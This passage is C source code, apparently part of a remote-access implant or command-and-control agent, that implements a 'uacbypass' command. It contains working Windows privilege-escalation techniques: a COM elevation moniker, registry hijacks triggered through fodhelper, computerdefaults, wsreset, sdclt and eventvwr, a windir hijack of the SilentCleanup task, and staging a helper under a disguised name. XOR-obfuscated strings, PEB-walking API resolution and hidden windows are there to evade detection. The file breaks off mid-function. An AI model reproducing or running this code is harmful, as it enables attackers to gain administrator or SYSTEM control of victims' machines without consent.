#include "commands.h"
#include "beacon.h"
#include "evasion.h"
#include "adv_lazy.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <tlhelp32.h>
#include <objbase.h>
#include <shellapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define IL_UNTRUSTED 0
#define IL_LOW       1
#define IL_MEDIUM    2
#define IL_HIGH      3
#define IL_SYSTEM    4

static int get_integrity_level(void)
{
    HANDLE hTok = NULL;
    { const adv_api_t *_a = adv_get();
      if (!_a->OpenProcessToken || !_a->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) return -1; }

    DWORD sz = 0;
    GetTokenInformation(hTok, TokenIntegrityLevel, NULL, 0, &sz);
    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)malloc(sz);
    if (!tml) { CloseHandle(hTok); return -1; }

    int il = -1;
    if (GetTokenInformation(hTok, TokenIntegrityLevel, tml, sz, &sz)) {
        DWORD rid = *GetSidSubAuthority(tml->Label.Sid,
                        *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
        if      (rid < 0x1000) il = IL_UNTRUSTED;
        else if (rid < 0x2000) il = IL_LOW;
        else if (rid < 0x3000) il = IL_MEDIUM;
        else if (rid < 0x4000) il = IL_HIGH;
        else                   il = IL_SYSTEM;
    }
    free(tml);
    CloseHandle(hTok);
    return il;
}

static int is_admin_group(void)
{
    BOOL admin = FALSE;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID admin_sid = NULL;
    if (AllocateAndInitializeSid(&nt, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0,0,0,0,0,0, &admin_sid)) {
        CheckTokenMembership(NULL, admin_sid, &admin);
        FreeSid(admin_sid);
    }
    return (int)admin;
}

static WCHAR *to_wide(const char *s)
{
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0) return NULL;
    WCHAR *w = (WCHAR *)malloc((size_t)n * sizeof(WCHAR));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

static void split_cmdline(const char *cmdline, char *exe_buf, size_t exe_sz,
                           char *args_buf, size_t args_sz)
{
    exe_buf[0] = args_buf[0] = '\0';
    if (!cmdline || !*cmdline) return;

    if (cmdline[0] == '"') {
        const char *end = strchr(cmdline + 1, '"');
        if (end) {
            size_t n = (size_t)(end - cmdline - 1);
            if (n >= exe_sz) n = exe_sz - 1;
            memcpy(exe_buf, cmdline + 1, n);
            exe_buf[n] = '\0';
            const char *rest = end + 1;
            while (*rest == ' ') rest++;
            strncpy(args_buf, rest, args_sz - 1);
            args_buf[args_sz - 1] = '\0';
            return;
        }
    }
    const char *sp = strchr(cmdline, ' ');
    if (!sp) {
        strncpy(exe_buf, cmdline, exe_sz - 1);
        exe_buf[exe_sz - 1] = '\0';
    } else {
        size_t n = (size_t)(sp - cmdline);
        if (n >= exe_sz) n = exe_sz - 1;
        memcpy(exe_buf, cmdline, n);
        exe_buf[n] = '\0';
        const char *rest = sp + 1;
        while (*rest == ' ') rest++;
        strncpy(args_buf, rest, args_sz - 1);
        args_buf[args_sz - 1] = '\0';
    }
}

static const IID _iid_ICMLuaUtil =
    {0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}};

typedef HRESULT (STDMETHODCALLTYPE *ICMLuaUtil_ShellExec_t)(
    void       *pThis,
    LPCWSTR     pwszFile,
    LPCWSTR     pwszParameters,
    LPCWSTR     pwszDirectory,
    ULONG       nShowCmd,
    ULONG       dwFlags
);

static int bypass_com(const char *cmdline, char *out, size_t outsz)
{
    if (!cmdline || !*cmdline)
        return snprintf(out, outsz, "e:0\n"), -1;

    WCHAR *exe_w  = to_wide(cmdline);
    WCHAR *args_w = NULL;
    if (!exe_w) return snprintf(out, outsz, "e:w\n"), -1;

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL com_init = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;

    WCHAR moniker[80];
    { volatile unsigned char _k = EVS_KEY;
      for (int _i = 0; _i < (int)sizeof(EVS_str_elevation_moniker); _i++)
          moniker[_i] = (WCHAR)(EVS_str_elevation_moniker[_i] ^ _k);
      moniker[sizeof(EVS_str_elevation_moniker)] = L'\0'; }

    BIND_OPTS3 bo;
    memset(&bo, 0, sizeof(bo));
    bo.cbStruct       = sizeof(BIND_OPTS3);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    void *pObj = NULL;
    hr = CoGetObject(moniker, (BIND_OPTS *)&bo, &_iid_ICMLuaUtil, &pObj);
    if (FAILED(hr) || !pObj) {
        free(exe_w); free(args_w);
        if (com_init) CoUninitialize();
        return snprintf(out, outsz, "e:cg %08lx\n", hr), -1;
    }

    ICMLuaUtil_ShellExec_t fn_ShellExec =
        (ICMLuaUtil_ShellExec_t)(*(void***)pObj)[9];

    hr = fn_ShellExec(pObj, exe_w, L"", NULL, 1 /*SW_SHOWNORMAL*/, 0);

    ((IUnknown *)pObj)->lpVtbl->Release((IUnknown *)pObj);
    free(exe_w);
    if (com_init) CoUninitialize();

    if (FAILED(hr))
        return snprintf(out, outsz, "e:se %08lx\n", hr), -1;

    return snprintf(out, outsz, "ok\n");
}

static int count_proc(const char *exename)
{
    DWORD self = GetCurrentProcessId();
    int n = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exename) == 0 && pe.th32ProcessID != self)
                n++;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return n;
}

static int reg_set_sz(HKEY root, const char *subkey, const char *valname, const char *data)
{
    HKEY hk;
    if (RegCreateKeyExA(root, subkey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL)
            != ERROR_SUCCESS) return -1;
    int rc = RegSetValueExA(hk, valname, 0, REG_SZ,
                            (const BYTE *)data, (DWORD)(strlen(data) + 1));
    RegCloseKey(hk);
    return rc == ERROR_SUCCESS ? 0 : -1;
}

static void reg_del_tree(HKEY root, const char *subkey)
{
    typedef LONG (WINAPI *RegDelTree_t)(HKEY, LPCSTR);
    static RegDelTree_t fn = NULL;
    if (!fn) {
        char fs[16], ms[14]; volatile unsigned char _k = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_RegDeleteTreeA); i++) fs[i] = (char)(EVS_fn_RegDeleteTreeA[i] ^ _k);
        fs[sizeof(EVS_fn_RegDeleteTreeA)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_advapi32); i++) ms[i] = (char)(EVS_dll_advapi32[i] ^ _k);
        ms[sizeof(EVS_dll_advapi32)] = '\0';
        HMODULE m = _peb_module(ms);
        SecureZeroMemory(ms, sizeof(ms));
        if (m) fn = (RegDelTree_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    if (fn) fn(root, subkey);
}

static void shell_exec_wait(const char *exe, int wait_ms)
{
    typedef BOOL (WINAPI *fnSEE)(SHELLEXECUTEINFOW *);
    static fnSEE pSEE = NULL;
    if (!pSEE) {
        char _sh[16], _dl[12];
        EVS_D(_sh, EVS_fn_ShellExecuteExW);
        EVS_D(_dl, EVS_dll_shell32);
        HMODULE h = _peb_module(_dl);
        if (!h) h = LoadLibraryA(_dl);
        SecureZeroMemory(_dl, sizeof(_dl));
        if (h) pSEE = (fnSEE)(void*)GetProcAddress(h, _sh);
        SecureZeroMemory(_sh, sizeof(_sh));
    }
    if (!pSEE) return;
    WCHAR *w = to_wide(exe);
    if (!w) return;
    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask  = 0;
    sei.lpVerb = L"open";
    sei.lpFile = w;
    sei.nShow  = SW_HIDE;
    pSEE(&sei);
    free(w);
    Sleep((DWORD)wait_ms);
}

static void make_safe_cmd(const char *cmdline, char *out, size_t outsz)
{
    /* Strip existing outer quotes to get a bare path, then re-wrap for start */
    char bare[2048 + MAX_PATH] = {0};
    if (cmdline[0] == '"') {
        const char *end = strrchr(cmdline, '"');
        if (end && end != cmdline) {
            size_t n = (size_t)(end - cmdline - 1);
            if (n >= sizeof(bare)) n = sizeof(bare) - 1;
            memcpy(bare, cmdline + 1, n);
            bare[n] = '\0';
        } else {
            strncpy(bare, cmdline, sizeof(bare) - 1);
        }
    } else {
        strncpy(bare, cmdline, sizeof(bare) - 1);
    }
    bare[sizeof(bare) - 1] = '\0';
    snprintf(out, outsz, "cmd /c start \"\" \"%s\"", bare);
}

static int bypass_lifter(const char *agent_path, char *out, size_t outsz)
{
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, sizeof(self) - 1);
    char lifter_path[MAX_PATH] = {0};
    strncpy(lifter_path, self, sizeof(lifter_path) - 1);
    char *last = strrchr(lifter_path, '\\');
    if (!last)
        return snprintf(out, outsz, "e:ps\n"), -1;
    char _lfn[11];
    EVS_D(_lfn, EVS_str_lifter_exe);
    snprintf(last + 1, (size_t)(lifter_path + sizeof(lifter_path) - last - 1), "%s", _lfn);
    SecureZeroMemory(_lfn, sizeof(_lfn));

    if (GetFileAttributesA(lifter_path) == INVALID_FILE_ATTRIBUTES)
        return snprintf(out, outsz, "e:nf\n"), -1;

    char tmp[MAX_PATH];
    GetTempPathA((DWORD)sizeof(tmp), tmp);
    char staged[MAX_PATH];
    char _pfx[8];
    EVS_D(_pfx, EVS_str_WinMgmt);
    snprintf(staged, sizeof(staged), "%s%s%04lX.exe",
             tmp, _pfx, (unsigned long)(GetTickCount() & 0xFFFF));
    SecureZeroMemory(_pfx, sizeof(_pfx));

    if (!CopyFileA(lifter_path, staged, FALSE))
        return snprintf(out, outsz, "e:cp %lu\n", GetLastError()), -1;

    char exec[MAX_PATH * 2 + 8];
    snprintf(exec, sizeof(exec), "\"%s\" \"%s\"", staged, agent_path);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, exec, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(staged);
        return snprintf(out, outsz, "e:cr %lu\n", GetLastError()), -1;
    }

    WaitForSingleObject(pi.hProcess, 6000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteFileA(staged);

    return snprintf(out, outsz, "ok\n");
}

static int bypass_fodhelper(const char *cmdline, char *out, size_t outsz)
{
    evasion_apply_thread(GetCurrentThread());

    char _ms[12], _de[16];
    EVS_D(_ms, EVS_str_ms_settings);
    EVS_D(_de, EVS_str_DelegateExecute);

    char key[128], root[64];
    snprintf(key,  sizeof(key),  "Software\\Classes\\%s\\shell\\open\\command", _ms);
    snprintf(root, sizeof(root), "Software\\Classes\\%s", _ms);
    SecureZeroMemory(_ms, sizeof(_ms));

    char sys32[MAX_PATH], fod[MAX_PATH + 16];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char _fn[14];
    EVS_D(_fn, EVS_str_fodhelper_exe);
    snprintf(fod, sizeof(fod), "%s\\%s", sys32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    char safe[2048 + MAX_PATH + 4] = {0};
    make_safe_cmd(cmdline, safe, sizeof(safe));

    if (reg_set_sz(HKEY_CURRENT_USER, key, NULL, safe) != 0 ||
        reg_set_sz(HKEY_CURRENT_USER, key, _de,  "")   != 0) {
        SecureZeroMemory(_de, sizeof(_de));
        reg_del_tree(HKEY_CURRENT_USER, root);
        return snprintf(out, outsz, "e:reg\n"), -1;
    }
    SecureZeroMemory(_de, sizeof(_de));

    shell_exec_wait(fod, 2000);
    reg_del_tree(HKEY_CURRENT_USER, root);

    return snprintf(out, outsz, "ok\n");
}

static int bypass_computerdefaults(const char *cmdline, char *out, size_t outsz)
{
    evasion_apply_thread(GetCurrentThread());

    char _ms[12], _de[16];
    EVS_D(_ms, EVS_str_ms_settings);
    EVS_D(_de, EVS_str_DelegateExecute);

    char key[128], root[64];
    snprintf(key,  sizeof(key),  "Software\\Classes\\%s\\shell\\open\\command", _ms);
    snprintf(root, sizeof(root), "Software\\Classes\\%s", _ms);
    SecureZeroMemory(_ms, sizeof(_ms));

    char sys32[MAX_PATH], bin[MAX_PATH + 24];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char _fn[21];
    EVS_D(_fn, EVS_str_computerdefaults_exe);
    snprintf(bin, sizeof(bin), "%s\\%s", sys32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    char safe[2048 + MAX_PATH + 4] = {0};
    make_safe_cmd(cmdline, safe, sizeof(safe));

    if (reg_set_sz(HKEY_CURRENT_USER, key, NULL, safe) != 0 ||
        reg_set_sz(HKEY_CURRENT_USER, key, _de,  "")   != 0) {
        SecureZeroMemory(_de, sizeof(_de));
        reg_del_tree(HKEY_CURRENT_USER, root);
        return snprintf(out, outsz, "e:reg\n"), -1;
    }
    SecureZeroMemory(_de, sizeof(_de));

    shell_exec_wait(bin, 2000);
    reg_del_tree(HKEY_CURRENT_USER, root);

    return snprintf(out, outsz, "ok\n");
}

static int bypass_wsreset(const char *cmdline, char *out, size_t outsz)
{
    evasion_apply_thread(GetCurrentThread());

    char _clsid[36];
    EVS_D(_clsid, EVS_str_wsreset_clsid);

    char key[192], root[128];
    snprintf(key,  sizeof(key),  "Software\\Classes\\%s\\Shell\\open\\command", _clsid);
    snprintf(root, sizeof(root), "Software\\Classes\\%s", _clsid);
    SecureZeroMemory(_clsid, sizeof(_clsid));

    char sys32[MAX_PATH], bin[MAX_PATH + 16];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char _fn[12];
    EVS_D(_fn, EVS_str_wsreset_exe);
    snprintf(bin, sizeof(bin), "%s\\%s", sys32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    if (GetFileAttributesA(bin) == INVALID_FILE_ATTRIBUTES) {
        return snprintf(out, outsz, "e:nf\n"), -1;
    }

    char safe[2048 + MAX_PATH + 4] = {0};
    make_safe_cmd(cmdline, safe, sizeof(safe));

    if (reg_set_sz(HKEY_CURRENT_USER, key, NULL, safe) != 0) {
        reg_del_tree(HKEY_CURRENT_USER, root);
        return snprintf(out, outsz, "e:reg\n"), -1;
    }

    shell_exec_wait(bin, 3000);
    reg_del_tree(HKEY_CURRENT_USER, root);

    return snprintf(out, outsz, "ok\n");
}

static int bypass_sdclt(const char *cmdline, char *out, size_t outsz)
{
    evasion_apply_thread(GetCurrentThread());

    char _ef[8];
    EVS_D(_ef, EVS_str_exefile);

    char key[128], root[64];
    snprintf(key,  sizeof(key),  "Software\\Classes\\%s\\shell\\runas\\command", _ef);
    snprintf(root, sizeof(root), "Software\\Classes\\%s", _ef);
    SecureZeroMemory(_ef, sizeof(_ef));

    char safe[2048 + MAX_PATH + 4] = {0};
    make_safe_cmd(cmdline, safe, sizeof(safe));

    if (reg_set_sz(HKEY_CURRENT_USER, key, NULL, safe) != 0) {
        reg_del_tree(HKEY_CURRENT_USER, root);
        return snprintf(out, outsz, "e:reg\n"), -1;
    }

    char sys32[MAX_PATH], sdp[MAX_PATH + 16];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char _fn[10];
    EVS_D(_fn, EVS_str_sdclt_exe);
    snprintf(sdp, sizeof(sdp), "%s\\%s", sys32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    typedef BOOL (WINAPI *fnSEE)(SHELLEXECUTEINFOW *);
    static fnSEE pSEE = NULL;
    if (!pSEE) {
        char _sh[16], _dl[12];
        EVS_D(_sh, EVS_fn_ShellExecuteExW);
        EVS_D(_dl, EVS_dll_shell32);
        HMODULE h = _peb_module(_dl);
        SecureZeroMemory(_dl, sizeof(_dl));
        if (h) pSEE = (fnSEE)(void*)GetProcAddress(h, _sh);
        SecureZeroMemory(_sh, sizeof(_sh));
    }
    if (pSEE) {
        WCHAR *wpath = to_wide(sdp);
        if (wpath) {
            SHELLEXECUTEINFOW sei = {0};
            sei.cbSize      = sizeof(sei);
            sei.fMask       = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
            sei.lpVerb      = L"open";
            sei.lpFile      = wpath;
            sei.lpParameters = L"/KickOffElev";
            sei.nShow       = SW_HIDE;
            pSEE(&sei);
            Sleep(400);
            if (sei.hProcess) CloseHandle(sei.hProcess);
            free(wpath);
        }
    }

    reg_del_tree(HKEY_CURRENT_USER, root);
    return snprintf(out, outsz, "ok\n");
}

static int bypass_eventvwr(const char *cmdline, char *out, size_t outsz)
{
    evasion_apply_thread(GetCurrentThread());

    char _mf[8];
    EVS_D(_mf, EVS_str_mscfile);

    char key[128], root[64];
    snprintf(key,  sizeof(key),  "Software\\Classes\\%s\\shell\\open\\command", _mf);
    snprintf(root, sizeof(root), "Software\\Classes\\%s", _mf);
    SecureZeroMemory(_mf, sizeof(_mf));

    char safe[2048 + MAX_PATH + 4] = {0};
    make_safe_cmd(cmdline, safe, sizeof(safe));

    if (reg_set_sz(HKEY_CURRENT_USER, key, NULL, safe) != 0) {
        reg_del_tree(HKEY_CURRENT_USER, root);
        return snprintf(out, outsz, "e:reg\n"), -1;
    }

    char sys32[MAX_PATH], evtw[MAX_PATH + 16];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char _fn[13];
    EVS_D(_fn, EVS_str_eventvwr_exe);
    snprintf(evtw, sizeof(evtw), "%s\\%s", sys32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));

    shell_exec_wait(evtw, 2000);
    reg_del_tree(HKEY_CURRENT_USER, root);

    return snprintf(out, outsz, "ok\n");
}

static int bypass_diskcleanup(const char *cmdline, char *out, size_t outsz)
{
    evasion_apply_thread(GetCurrentThread());

    char _ev[12], _wd[7];
    EVS_D(_ev, EVS_str_Environment);
    EVS_D(_wd, EVS_str_windir);

    char hijacked[2048 + MAX_PATH + 32] = {0};
    snprintf(hijacked, sizeof(hijacked), "cmd /K \"%s\" & REM ", cmdline);

    if (reg_set_sz(HKEY_CURRENT_USER, _ev, _wd, hijacked) != 0) {
        SecureZeroMemory(_ev, sizeof(_ev));
        SecureZeroMemory(_wd, sizeof(_wd));
        return snprintf(out, outsz, "e:wd\n"), -1;
    }

    char sys32[MAX_PATH], sched[MAX_PATH + 16];
    GetSystemDirectoryA(sys32, MAX_PATH);
    char _sfn[13];
    EVS_D(_sfn, EVS_str_schtasks_exe);
    snprintf(sched, sizeof(sched), "%s\\%s", sys32, _sfn);
    SecureZeroMemory(_sfn, sizeof(_sfn));

    char _sc[14];
    EVS_D(_sc, EVS_str_SilentCleanup);
    char taskpath[64];
    snprintf(taskpath, sizeof(taskpath), "\\Microsoft\\Windows\\DiskCleanup\\%s", _sc);
    SecureZeroMemory(_sc, sizeof(_sc));

    char full_cmd[MAX_PATH + 128];
    snprintf(full_cmd, sizeof(full_cmd),
             "\"%s\" /Run /TN \"%s\" /I", sched, taskpath);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    BOOL ok = CreateProcessA(NULL, full_cmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    Sleep(4000);

    HKEY henv = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, _ev, 0, KEY_SET_VALUE, &henv) == ERROR_SUCCESS) {
        RegDeleteValueA(henv, _wd);
        RegCloseKey(henv);
    }
    SecureZeroMemory(_ev, sizeof(_ev));
    SecureZeroMemory(_wd, sizeof(_wd));

    if (!ok)
        return snprintf(out, outsz, "e:st %lu\n", GetLastError()), -1;

    return snprintf(out, outsz, "ok\n");
}

static int bypass_runas(const char *cmdline, char *out, size_t outsz)
{
    if (!cmdline || !*cmdline)
        return snprintf(out, outsz, "e:0\n"), -1;

    WCHAR *exe_w = to_wide(cmdline);
    if (!exe_w) return snprintf(out, outsz, "e:w\n"), -1;

    typedef BOOL (WINAPI *fnSEE)(SHELLEXECUTEINFOW *);
    static fnSEE pSEE = NULL;
    if (!pSEE) {
        char _sh[16], _dl[12];
        EVS_D(_sh, EVS_fn_ShellExecuteExW);
        EVS_D(_dl, EVS_dll_shell32);
        HMODULE h = _peb_module(_dl);
        if (!h) h = LoadLibraryA(_dl);
        SecureZeroMemory(_dl, sizeof(_dl));
        if (h) pSEE = (fnSEE)(void*)GetProcAddress(h, _sh);
        SecureZeroMemory(_sh, sizeof(_sh));
    }
    if (!pSEE) { free(exe_w); return snprintf(out, outsz, "e:see\n"), -1; }

    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb       = L"runas";
    sei.lpFile       = exe_w;
    sei.lpParameters = L"";
    sei.nShow        = SW_SHOW;

    BOOL ok = pSEE(&sei);
    DWORD err = GetLastError();
    free(exe_w);

    if (!ok) {
        if (err == ERROR_CANCELLED)
            return snprintf(out, outsz, "e:u\n"), -1;
        return snprintf(out, outsz, "e:se %lu\n", err), -1;
    }

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 3000);
        CloseHandle(sei.hProcess);
    } else {
        Sleep(3000);
    }

    return snprintf(out, outsz, "ok\n");
}

static void _enable_sedebug(void);

int cmd_uacbypass(const char *args, char *output_buf, size_t output_size)
{
    memset(output_buf, 0, output_size);

    int il = get_integrity_level();

    if (il >= IL_SYSTEM) {
        snprintf(output_buf, output_size, "ok:s\n");
        return 0;
    }

    if (il >= IL_HIGH) {
        _enable_sedebug();
        return cmd_getsystem(NULL, output_buf, output_size);
    }

    {
        HANDLE htok = NULL;
        TOKEN_ELEVATION_TYPE etype = TokenElevationTypeDefault;
        { const adv_api_t *_a = adv_get();
          if (_a->OpenProcessToken && _a->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htok)) {
              DWORD tsz = sizeof(etype);
              GetTokenInformation(htok, TokenElevationType, &etype, tsz, &tsz);
              CloseHandle(htok);
          }
        }
        if (etype != TokenElevationTypeLimited) {
            snprintf(output_buf, output_size, "e:il\n");
            return -1;
        }
    }

    {
        HKEY hpol = NULL;
        DWORD consent = 0xFFFF, psz = sizeof(consent);
        { char _rp[57], _rv[28]; volatile unsigned char _k = EVS_KEY;
          for (int _i = 0; _i < (int)sizeof(EVS_str_reg_policies_system); _i++)
              _rp[_i] = (char)(EVS_str_reg_policies_system[_i] ^ _k);
          _rp[sizeof(EVS_str_reg_policies_system)] = '\0';
          for (int _i = 0; _i < (int)sizeof(EVS_str_ConsentPromptBehaviorAdmin); _i++)
              _rv[_i] = (char)(EVS_str_ConsentPromptBehaviorAdmin[_i] ^ _k);
          _rv[sizeof(EVS_str_ConsentPromptBehaviorAdmin)] = '\0';
          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, _rp, 0, KEY_QUERY_VALUE, &hpol) == ERROR_SUCCESS) {
              RegQueryValueExA(hpol, _rv, NULL, NULL, (BYTE *)&consent, &psz);
              RegCloseKey(hpol);
          }
          SecureZeroMemory(_rp, sizeof(_rp)); SecureZeroMemory(_rv, sizeof(_rv)); }
        size_t _diag_off = strlen(output_buf);
        if (_diag_off < output_size - 1)
            snprintf(output_buf + _diag_off, output_size - _diag_off,
                "cp=%lu\n", consent);
    }

    evasion_apply_thread(GetCurrentThread());

    {
        char own_id[AGENT_ID_LEN + 1];
        agent_gen_id(own_id);
        agent_write_parent_id(own_id);
    }

    char method[32]    = "auto";
    char cmdline[2048] = {0};

    char _m_auto[]  = {'a','u','t','o',0};
    char _m_com[]   = {'c','o','m',0};
    char _m_lft[]   = {'l','i','f','t','e','r',0};
    char _m_fod[]   = {'f','o','d','h','e','l','p','e','r',0};
    char _m_sdc[]   = {'s','d','c','l','t',0};
    char _m_cdf[]   = {'c','o','m','p','u','t','e','r','d','e','f','a','u','l','t','s',0};
    char _m_wsr[]   = {'w','s','r','e','s','e','t',0};
    char _m_evt[]   = {'e','v','e','n','t','v','w','r',0};
    char _m_dck[]   = {'d','i','s','k','c','l','e','a','n','u','p',0};
    char _m_run[]   = {'r','u','n','a','s',0};

    if (!args || !*args) {
        GetModuleFileNameA(NULL, cmdline, sizeof(cmdline) - 1);
    } else {
        const char *p = args;
        char first[64] = {0};
        int i = 0;
        while (*p && *p != ' ' && i < 63) first[i++] = *p++;
        while (*p == ' ') p++;

        if (strcmp(first, _m_auto) == 0 || strcmp(first, _m_com) == 0 ||
            strcmp(first, _m_lft)  == 0 ||
            strcmp(first, _m_fod)  == 0 || strcmp(first, _m_sdc) == 0 ||
            strcmp(first, _m_cdf)  == 0 || strcmp(first, _m_wsr) == 0 ||
            strcmp(first, _m_evt)  == 0 || strcmp(first, _m_dck) == 0 ||
            strcmp(first, _m_run)  == 0) {
            strncpy(method, first, sizeof(method) - 1);
            method[sizeof(method) - 1] = '\0';
            if (*p) { strncpy(cmdline, p, sizeof(cmdline) - 1); cmdline[sizeof(cmdline) - 1] = '\0'; }
            else GetModuleFileNameA(NULL, cmdline, sizeof(cmdline) - 1);
        } else {
            strncpy(cmdline, args, sizeof(cmdline) - 1);
        }
    }

    char self_name[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self_name, sizeof(self_name) - 1);
    const char *bn = strrchr(self_name, '\\');
    bn = bn ? bn + 1 : self_name;

    int before = count_proc(bn);
    int rc = -1;

#define TRY_BYPASS(fn_name, label) do { \
    agent_write_gs_flag(); \
    size_t _off = strlen(output_buf); \
    char *_b = (_off + 1 < output_size) ? output_buf + _off : output_buf + output_size - 1; \
    size_t _z = (_off + 1 < output_size) ? output_size - _off : 1; \
    rc = fn_name(cmdline, _b, _z); \
    if (rc >= 0) { \
        int after = before, gs_gone = 0; \
        for (int _w = 0; _w < 6; _w++) { \
            after   = count_proc(bn); \
            gs_gone = !agent_gs_flag_exists(); \
            if (after > before || gs_gone) break; \
            Sleep(1000); \
        } \
        if (after > before || gs_gone) { \
            if (!after && gs_gone) { \
                size_t _gg = strlen(output_buf); \
                if (_gg + 1 < output_size) \
                    snprintf(output_buf + _gg, output_size - _gg, "ok:gs\n"); \
            } \
            goto spawned; \
        } \
        rc = -1; \
    } \
} while(0)

    if (strcmp(method, _m_lft) == 0) {
        TRY_BYPASS(bypass_lifter, "lifter");
    } else if (strcmp(method, _m_run) == 0) {
        TRY_BYPASS(bypass_runas, "runas");
    } else if (strcmp(method, _m_com) == 0) {
        size_t _o0 = strlen(output_buf);
        rc = bypass_com(cmdline,
                        output_buf + _o0,
                        _o0 < output_size ? output_size - _o0 : 1);
    } else if (strcmp(method, _m_fod) == 0) {
        TRY_BYPASS(bypass_fodhelper, "fodhelper");
    } else if (strcmp(method, _m_sdc) == 0) {
        TRY_BYPASS(bypass_sdclt, "sdclt");
    } else if (strcmp(method, _m_cdf) == 0) {
        TRY_BYPASS(bypass_computerdefaults, "computerdefaults");
    } else if (strcmp(method, _m_wsr) == 0) {
        TRY_BYPASS(bypass_wsreset, "wsreset");
    } else if (strcmp(method, _m_evt) == 0) {
        TRY_BYPASS(bypass_eventvwr, "eventvwr");
    } else if (strcmp(method, _m_dck) == 0) {
        TRY_BYPASS(bypass_diskcleanup, "diskcleanup");
    } else {
        TRY_BYPASS(bypass_lifter,           "lifter");
        TRY_BYPASS(bypass_eventvwr,         "eventvwr");
        TRY_BYPASS(bypass_diskcleanup,      "diskcleanup");
        TRY_BYPASS(bypass_fodhelper,        "fodhelper");
        TRY_BYPASS(bypass_computerdefaults, "computerdefaults");
        TRY_BYPASS(bypass_sdclt,            "sdclt");
        TRY_BYPASS(bypass_wsreset,          "wsreset");
        {
            size_t _oc = strlen(output_buf);
            char *_bc = (_oc + 1 < output_size) ? output_buf + _oc : output_buf + output_size - 1;
            size_t _zc = (_oc + 1 < output_size) ? output_size - _oc : 1;
            agent_write_gs_flag();
            int _before_c = before;
            int _com_rc   = bypass_com(cmdline, _bc, _zc);
            if (_com_rc >= 0) {
                Sleep(2000);
                int _after_c = count_proc(bn);
                int _gs_c    = !agent_gs_flag_exists();
                if (_after_c > _before_c || _gs_c) { rc = 0; goto spawned; }
            }
        }
        TRY_BYPASS(bypass_runas, "runas");
    }

    {
        size_t off = strlen(output_buf);
        if (off < output_size - 1)
            snprintf(output_buf + off, output_size - off, "e:all\n");
    }
    return -1;

spawned:;
    {
        size_t off = strlen(output_buf);
        if (off < output_size - 1)
            snprintf(output_buf + off, output_size - off, "ok\n");
    }
    return 0;
}

static void _enable_sedebug(void)
{
    const adv_api_t *adv = adv_get();
    if (!adv->OpenProcessToken || !adv->LookupPrivilegeValueA || !adv->AdjustTokenPrivileges)
        return;
    HANDLE htok = NULL;
    if (!adv->OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &htok)) return;
    LUID luid;
    char _sd[20]; { volatile unsigned char _k = EVS_KEY;
      for (int _i = 0; _i < (int)sizeof(EVS_str_SeDebugPrivilege); _i++)
          _sd[_i] = (char)(EVS_str_SeDebugPrivilege[_i] ^ _k);
      _sd[sizeof(EVS_str_SeDebugPrivilege)] = '\0'; }
    if (adv->LookupPrivilegeValueA(NULL, _sd, &luid)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount           = 1;
